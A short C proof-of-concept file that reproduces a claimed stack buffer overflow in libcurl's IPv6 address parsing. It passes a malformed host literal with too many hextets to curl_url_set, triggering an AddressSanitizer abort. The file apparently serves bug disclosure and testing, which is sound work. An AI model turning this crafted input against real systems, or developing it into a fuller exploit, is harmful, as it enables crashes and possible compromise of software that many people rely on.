/* PoC: curl_url_set(CURLUPART_URL, ...) with an IPv6 host literal that has
 * too many hextets and no trailing colon drives curlx_inet_pton6() past the
 * end of its on-stack 16-byte buffer when committing the final pending
 * group, aborting under AddressSanitizer. */
#include <stdio.h>
#include <curl/curl.h>

int main(void)
{
  CURLU *h = curl_url();
  CURLUcode rc;

  if(!h)
    return 2;

  rc = curl_url_set(h, CURLUPART_URL, "http://[1:2:3:4:5:6:7:8:9]/", 0);
  printf("curl_url_set returned %d\n", (int)rc);

  curl_url_cleanup(h);
  return 0;
}
